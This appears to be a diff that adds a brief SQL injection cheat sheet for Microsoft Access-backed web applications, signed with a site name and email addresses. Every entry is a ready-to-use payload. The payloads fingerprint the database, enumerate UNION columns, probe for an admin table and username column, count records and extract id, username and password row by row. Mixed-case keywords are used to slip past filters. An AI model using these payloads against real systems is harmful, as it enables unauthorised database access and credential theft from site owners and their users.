@@ -1,0 +1,27 @@
+>>>  Confirm db type:
+ aNd aSc(cHr(97))=97
+ AnD eXiStS(sElEcT iD FrOm msysaccessobjects)
+ 
+
+>>>  Scan UNION params:
+ uNION sELECT '1','2','3','4'...,'n' fROM MSysAccessObjects
+
+>>>  Table exists?:
+ AnD exiSts (sElEcT ToP 1 * FrOm [admin]) 
+
+>>>  Column exists?£º
+ AnD exiSts (sElEcT ToP 1 [username] FrOm [admin]) 
+
+>>>  Get record count:
+ uNION sELECT 1,(sELECT cSTR(cOUNT(*)) fROM [admin]),3,4,5,6 fROM MSysAccessObjects
+
+>>>  Get data:
+ uNION sELECT 1,(sELECT tOP 1 cSTR(id)+chr(9)+cSTR(username)+chr(9)+cSTR(password) fROM(sELECT TOP __i__ * fROM admin oRDER bY id) oRDER bY id dESC),3,4,5,6  fROM MSysAccessObjects
+
+>>>  Get system path:
+ aND eXISTS(sELECT c fROM liah.t)
+
+
+	www.liqidis.com
+	liqidis@hotmail.com
+	liqidis@gmail.com
